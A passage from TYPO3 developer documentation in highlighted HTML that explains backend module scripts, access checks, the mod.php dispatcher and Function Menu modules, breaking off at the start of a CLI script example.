<FONT COLOR="#000000"> 148:<FONT COLOR="#007700"> </FONT><FONT COLOR="#0000bb">$SOBE</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">main</FONT><FONT COLOR="#007700">();</FONT></FONT>
<FONT COLOR="#000000"> 149:<FONT COLOR="#007700"> </FONT><FONT COLOR="#0000bb">$SOBE</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">printContent</FONT><FONT COLOR="#007700">();</FONT></FONT></PRE>
<UL>
	<LI><P CLASS="western">Lines 30-32 does the basic initialization</P>
	<LI><P CLASS="western">Line 33 includes the backend document
	template class and language class (provides the $LANG and
	$TBE_TEMPLATE objects).</P>
	<LI><P CLASS="western">Line 34 includes the main &quot;locallang&quot;
	file for the script</P>
	<LI><P CLASS="western">Line 36 includes the base class for the class
	in the script</P>
	<LI><P CLASS="western">Line 37 is where you should do your access
	check if you want to apply any.</P>
	<LI><P CLASS="western">Line 40 to 132 defines the class that is
	called to create all output from this file. Notice that it extends
	&quot;t3lib_SCbase&quot; which is normal (but not required!) for
	backend modules and stand-alone scripts. The &quot;SCbase&quot;
	class provides some APIs for various things you often need.</P>
	<LI><P CLASS="western">Line 136-138 checks for XCLASS extensions of
	the scripts class.</P>
	<LI><P CLASS="western">Finally, line 144-149 instantiates the script
	class and calls the methods inside to render and output the content.</P>
</UL>
<H4 CLASS="western">Checking for module access</H4>
<P CLASS="western">If the script is a true backend module you should
check for module access in line 37 where there is currently just a
comment. The access is easily checked by this API function where you
simply give the $MCONF array as argument. The function will check
what kind of access criteria are in the $MCONF array and then
evaluate the situation accordingly. In this case it will exit with a
an error message if the user is not logged in.</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// This checks permissions and exits if the users has no permission for entry.</FONT></FONT>
<FONT COLOR="#0000bb">$BE_USER</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">modAccess</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">1</FONT><FONT COLOR="#007700">);</FONT></PRE><H4 CLASS="western">
Checking for &quot;admin&quot; user</H4>
<P CLASS="western">In case your backend script requires the &quot;admin&quot;
user to be logged in it is easy to do a check:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#000000"><FONT COLOR="#007700">if (!</FONT><FONT COLOR="#0000bb">$BE_USER</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">isAdmin</FONT><FONT COLOR="#007700">()) die(</FONT><FONT COLOR="#dd0000">'No access for you...'</FONT><FONT COLOR="#007700">);</FONT></FONT></PRE><P CLASS="western">
See the <A HREF="#Backend%20User%20Object%7Coutline">API for the
$BE_USER object</A> for more details.</P>
<H4 CLASS="western">More details</H4>
<P CLASS="western">Please refer to the comments inside of the class
file &quot;t3lib/class.t3lib_scbase.php&quot; for more details on a
basic framework for backend modules (&quot;script classes&quot;). If
you want to start a new backend module you should definitely use the
Kicstarter Wizard to do so. It will set up all the basics for you.</P>
<H3 CLASS="western"><A NAME="2.5.4.Backend modules using typo3/mod.php|outline"></A>
Backend modules using typo3/mod.php</H3>
<P CLASS="western">With version 4.1 of TYPO3 there is a new and
better framework for integration of backend modules into the backend.
The main principle is, that all backend modules using this method are
called through a central script, “mod.php” in typo3/. This way,
we get rid of the trouble with conf.php files in need of modification
when installing extensions in local, global and system scopes.</P>
<H4 CLASS="western">Introduction</H4>
<P CLASS="western">Traditionally, a backend module runs directly from
its own “index.php” script (or named otherwise as set up with
$MCONF['script']). In order to initialize it must include the
typo3/init.php file. Accessing this file requires the module conf.php
file to hold the “BACK_PATH” to the typo3/ directory. This will
differ depending on where the extension the module is in is
installed: locally in typo3conf/ext/ or as a global/system extension.
So not only is the conf.php file changed by the Extension Manager
when installing extensions, it also makes it very tricky and possibly
error-prone to share local extensions between sites with symlinks!</P>
<P CLASS="western">Using mod.php makes it all work differently.
Examples in the core can already be seen. For instance the “Tools &gt;
User Admin” uses this method now. Instead of directly calling the
script “typo3/sysext/beuser/mod/index.php”, the script
“typo3/mod.php?M=tools_beuser” is called which will look up (in
$TBE_MODULES['_PATHS']) which script is associated with
“tools_beuser” and include that. The mod.php script also
initializes the backend, includes configuration and so on.</P>
<H4 CLASS="western">Adapting existing modules to this method</H4>
<P CLASS="western">Generally, you can create a module as you always
did and then make these changes:</P>
<UL>
	<LI><P CLASS="western">conf.php</P>
	<UL>
		<LI><P CLASS="western">Comment out (or remove!) the lines with the
		TYPO3_MOD_PATH and BACK_PATH definitions. They are not needed
		anymore ($BACK_PATH is blank for scripts running in typo3/ as
		mod.php does).<BR>Examples:<BR><BR>#define('TYPO3_MOD_PATH',
		'sysext/beuser/mod/');<BR>#$BACK_PATH='../../../';</P>
		<LI><P CLASS="western">Set the value of $MCONF['script'] to
		“_DISPATCH”. This will make sure links to the module are
		pointed to “mod.php” instead of the real script of the module.
		This is only needed for modules appearing in the menu as a main- or
		submodule. <BR>Example:<BR><BR>$MCONF['script']='_DISPATCH';</P>
	</UL>
	<LI><P CLASS="western">ext_emconf.php</P>
	<UL>
		<LI><P CLASS="western">Remove the module name from the “module”
		entry in the array! This entry was what instructed the Extension
		Manager to modify TYPO3_MOD_PATH and BACK_PATH in the conf.php file
		of the module during installation of the extension. Since this is
		not needed any more.</P>
	</UL>
	<LI><P CLASS="western">Module script name</P>
	<UL>
		<LI><P CLASS="western">Must be “index.php” - but most modules
		will be that anyway. That's the convension.</P>
	</UL>
	<LI><P CLASS="western">index.php (the module script)</P>
	<UL>
		<LI><P CLASS="western">In the module script you will have to
		comment out / remove those lines that are initializing the
		module:<BR><BR>#unset($MCONF);<BR>#require ('conf.php');<BR>#require
		($BACK_PATH.'init.php');<BR>#require
		($BACK_PATH.'template.php');<BR><BR>This is logical because this
		initialization is now done by mod.php.</P>
		<LI><P CLASS="western">Observe that the main script changed! When
		the module is calling it self, any hardcoded values for the script
		name (like “index.php?id=123”) must be changed. Now you must
		call “mod.php?M=[moduleKey]&amp;id=123”. Its suggested you use 
		htmlspecialchars($GLOBALS['MCONF']['_']) as a reference to
		&quot;thisScript&quot; and add parameters like .&quot;&amp;par=val&quot;</P>
	</UL>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Context Menus: You will of course have to modify
the clickmenu-class to call &quot;mod.php?M=[module name here]&quot;
where module name most logically is the value of &quot;$MCONF['name']&quot;
from the conf.php file.</P>
<P CLASS="western">Also, if you use this method for not-menu-modules,
you must call t3lib_extMgm::addModulePath() from ext_tables.php to
register the path of the module. Example:</P>
<P CLASS="western">	t3lib_extMgm::addModulePath('xMOD_tximpexp',t3lib_extMgm::extPath($_EXTKEY).'app/');</P>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.5.5.Function Menu modules|outline"></A>
Function Menu modules</H3>
<P CLASS="western">Function Menu modules are integrated in existing
backend modules that supports this feature. In the core the modules
Web&gt;Info and Web&gt;Function does so. Also Web&gt;Template and
even User&gt;Taskcenter does!</P>
<P CLASS="western">Function Menu modules are accessed through the
function menu of the host module:</P>
<P CLASS="western"><IMG SRC="10_html_mc202cae.png" NAME="Graphic112" ALIGN=LEFT WIDTH=523 HEIGHT=102 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In this example the Web&gt;Functions module is the
host backend module and the selector box in the upper right corner
shows the two Function menu modules attached to Web&gt;Functions. It
turns out that the function menu module &quot;Wizards&quot; supports
even another level of externally attached scripts - a &quot;second
level Function Menu module&quot;. The API for adding elements to the
second level is the same as for the first.</P>
<H4 CLASS="western">Attaching Function Menu modules to the host
backend module</H4>
<P CLASS="western">Function Menu modules live in the environment of
the host backend module. Therefore they have no conf.php files etc.
All they do is to supply a PHP class which is called when they need
to be activated. Like any other module they have to render the
content and return it then.</P>
<P CLASS="western">Attaching Function Menu modules to a host backend
module is done by adding some values to an array in the global scope.
To make this easy there is API function calls to do that which you
should use. To create a Function Menu on the first level you would
include this code in the &quot;ext_tables.php&quot; file of the
extension:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">if (</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">==</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">)&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">insertModuleFunction</FONT><FONT COLOR="#007700">(</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'web_func'</FONT><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'tx_temp_modfunc1'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">extPath</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$_EXTKEY</FONT><FONT COLOR="#007700">).</FONT><FONT COLOR="#dd0000">'modfunc1/class.tx_temp_modfunc1.php'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'LLL:EXT:temp/locallang_db.php:moduleFunction.tx_temp_modfunc1'</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#dd0000">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">}</FONT></PRE><P CLASS="western">
If you want to insert it on the second level this would be used (for
the Wizards example above):</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">if (</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">==</FONT><FONT COLOR="#dd0000">'BE'</FONT><FONT COLOR="#007700">)&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">insertModuleFunction</FONT><FONT COLOR="#007700">(</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'web_func'</FONT><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'tx_temp_modfunc2'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_extMgm</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">extPath</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$_EXTKEY</FONT><FONT COLOR="#007700">).</FONT><FONT COLOR="#dd0000">'modfunc2/class.tx_temp_modfunc2.php'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'LLL:EXT:temp/locallang_db.php:moduleFunction.tx_temp_modfunc2'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><B><FONT COLOR="#dd0000">'wiz'&nbsp;&nbsp;&nbsp;&nbsp;</FONT></B></FONT>
<FONT COLOR="#000000"><FONT COLOR="#dd0000">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">}</FONT></PRE><P CLASS="western">
Notice the only difference; The addition of the fifth argument in the
function call pointing to the first level Function Menu item.</P>
<H4 CLASS="western">Basic framework</H4>
<P CLASS="western">The Function Menu module code is found in a class
in the scripts pointed to in the configuration. Such a class extends
the class &quot;t3lib_extobjbase&quot; which is designed to handle
all the basic management of a Function Menu module.</P>
<P CLASS="western">A basic framework for a Function Menu module looks
like this:</P>
<PRE CLASS="western"><FONT COLOR="#000000">   1:<FONT COLOR="#0000bb"> </FONT><FONT COLOR="#007700">require_once(</FONT><FONT COLOR="#0000bb">PATH_t3lib</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">&quot;class.t3lib_extobjbase.php&quot;</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">   2:</FONT> </FONT>
<FONT COLOR="#000000">   3:<FONT COLOR="#007700"> class </FONT><FONT COLOR="#0000bb">tx_temp_modfunc1 </FONT><FONT COLOR="#007700">extends </FONT><FONT COLOR="#0000bb">t3lib_extobjbase </FONT><FONT COLOR="#007700">{</FONT></FONT>
<FONT COLOR="#000000">   4:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;function </FONT><FONT COLOR="#0000bb">modMenu</FONT><FONT COLOR="#007700">()&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000">   5:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global </FONT><FONT COLOR="#0000bb">$LANG</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">   6:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">   7:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return Array (</FONT>
<FONT COLOR="#000000">   8:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">&quot;tx_temp_modfunc1_check&quot; </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">&quot;&quot;</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">   9:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  10:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;}</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  11:</FONT> </FONT>
<FONT COLOR="#000000">  12:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;function </FONT><FONT COLOR="#0000bb">main</FONT><FONT COLOR="#007700">()&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000">  13:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Initializes the module. Done in this function because we may need to re-initialize if data is submitted!</FONT></FONT>
<FONT COLOR="#000000">  14:<FONT COLOR="#ff8000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#007700">global </FONT><FONT COLOR="#0000bb">$SOBE</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$BE_USER</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$LANG</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$TCA_DESCR</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$TCA</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$CLIENT</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  15:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT>
<FONT COLOR="#000000">  16:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$theOutput</FONT><FONT COLOR="#007700">.=</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">pObj</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">doc</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">spacer</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">5</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  17:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$theOutput</FONT><FONT COLOR="#007700">.=</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">pObj</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">doc</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">section</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$LANG</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">getLL</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">&quot;title&quot;</FONT><FONT COLOR="#007700">),</FONT><FONT COLOR="#dd0000">&quot;Dummy content here...&quot;</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">0</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">1</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  18:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT>
<FONT COLOR="#000000">  19:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$menu</FONT><FONT COLOR="#007700">=array();</FONT></FONT>
<FONT COLOR="#000000">  20:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$menu</FONT><FONT COLOR="#007700">[]=</FONT><FONT COLOR="#0000bb">t3lib_BEfunc</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">getFuncCheck</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">pObj</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">id</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">&quot;SET[tx_temp_modfunc1_check]&quot;</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">pObj</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">MOD_SETTINGS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;tx_temp_modfunc1_check&quot;</FONT><FONT COLOR="#007700">]).</FONT><FONT COLOR="#0000bb">$LANG</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">getLL</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">&quot;checklabel&quot;</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  21:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$theOutput</FONT><FONT COLOR="#007700">.=</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">pObj</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">doc</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">spacer</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">5</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  22:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$theOutput</FONT><FONT COLOR="#007700">.=</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">pObj</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">doc</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">section</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">&quot;Menu&quot;</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">implode</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">&quot; - &quot;</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$menu</FONT><FONT COLOR="#007700">),</FONT><FONT COLOR="#0000bb">0</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">1</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  23:</FONT> </FONT>
<FONT COLOR="#000000">  24:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return </FONT><FONT COLOR="#0000bb">$theOutput</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  25:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;}</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  26:</FONT> }</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  27:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  28:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  29:</FONT> </FONT>
<FONT COLOR="#000000">  30:<FONT COLOR="#007700"> if (</FONT><FONT COLOR="#0000bb">defined</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">&quot;TYPO3_MODE&quot;</FONT><FONT COLOR="#007700">) &amp;&amp; </FONT><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;XCLASS&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;ext/temp/modfunc1/class.tx_temp_modfunc1.php&quot;</FONT><FONT COLOR="#007700">])&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000">  31:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;include_once(</FONT><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;XCLASS&quot;</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">&quot;ext/temp/modfunc1/class.tx_temp_modfunc1.php&quot;</FONT><FONT COLOR="#007700">]);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  32:</FONT> }</FONT></PRE><P CLASS="western">
From the code you might be able to figure out that the host backend
module is available as the object reference $this-&gt;pObj. In this
code listing it is used to access the document template object for
rendering the output.</P>
<H4 CLASS="western">More details</H4>
<P CLASS="western">More details about Function Menu modules and the
framework of &quot;t3lib_extobjbase&quot; is found in extension
programming tutorials and inside the class &quot;t3lib_extobjbase&quot;
itself!</P>
<H3 CLASS="western"><A NAME="2.5.6.Creating new backend scripts|outline"></A>
Creating new backend scripts</H3>
<P CLASS="western">If you want to create a new backend main- or
sub-module, create a new CSM item or a Function Menu module the best
way to start yourself up is to use the Kickstarter. In a few clicks
you have configured the basic framework and you get all the tedious
and error prone work done for you automatically. Immediately you can
begin to concentrate on the coding of your backend application.</P>
<P CLASS="western">In the Kickstarter, the menu items for backend
scripts are found here:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m94d933e.png" NAME="Graphic111" ALIGN=LEFT WIDTH=175 HEIGHT=379 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">For details on actual extension programming (which
will also cover backend module programming), please refer to some of
the extension programming tutorials around.</P>
<H3 CLASS="western"><A NAME="2.5.7.Initialize TYPO3 backend in a PHP shell script (CLI mode)|outline"></A>
Initialize TYPO3 backend in a PHP shell script (CLI mode)</H3>
<P CLASS="western">Most scripts in TYPO3 expect to be executed from a
web browser. However you might need to create a PHP script which is
executed in a Unix shell as a cronjob. In itself PHP is capable of
that as long as PHP was also compiled as a binary (typically
“/usr/bin/php”) but you need to do some tricks in order to
initialize TYPO3s backend environment.</P>
<H4 CLASS="western">Tricky script path</H4>
<P CLASS="western">The greatest challenge is to make the script
recognize its own path. This is necessary for all includes
afterwards. It seems that the path of the script is available as the
variable $_ENV['_'] in most cases. However it changes value depending
on how you call the script. In order to make life easy for our
programming we decide that the script must always be executed by its
absolute path. So “./myphpshellscript.phpsh” will not work, but
“/abs/path/to/typo3conf/ext/myext/ myphpshellscript.phpsh” will.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Note about FreeBSD:</B> It has been reported
(by Rainer Kuhn, punkt.de – thanks) that on FreeBSD the path is not
available in $_ENV['_'] but can be extracted from
$_SERVER['argv'][0]. Generally there are not enough experience and
knowledge about this issue to state something final, but for now we
suggest a fall back solution as seen below where $_ENV['_'] is tested
and if not found, falls back to $_SERVER['argv'][0]</P>
<H4 CLASS="western">Basic framework</H4>
<P CLASS="western">To set up a PHP shell script that initializes the
TYPO3 you create a file with the framework here:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000">   1:<FONT COLOR="#0000bb"> </FONT><FONT COLOR="#ff8000">#! /usr/bin/php -q</FONT></FONT>
<FONT COLOR="#000000">   2:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#007700">&lt;?</FONT><FONT COLOR="#0000bb">php</FONT></FONT>
<FONT COLOR="#0000bb"><FONT COLOR="#000000">   3:</FONT> </FONT>
<FONT COLOR="#000000">   4:<FONT COLOR="#0000bb"> </FONT><FONT COLOR="#ff8000">// *****************************************</FONT></FONT>
<FONT COLOR="#ff8000"><FONT COLOR="#000000">   5:</FONT> // Standard initialization of a CLI module:</FONT>
<FONT COLOR="#ff8000"><FONT COLOR="#000000">   6:</FONT> // *****************************************</FONT>
<FONT COLOR="#ff8000"><FONT COLOR="#000000">   7:</FONT> </FONT>
<FONT COLOR="#ff8000"><FONT COLOR="#000000">   8:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;// Defining circumstances for CLI mode:</FONT>
<FONT COLOR="#000000">   9:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_cliMode'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#0000bb">TRUE</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  10:</FONT> </FONT>
<FONT COLOR="#000000">  11:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Defining PATH_thisScript here: Must be the ABSOLUTE path of this script in the right context:</FONT></FONT>
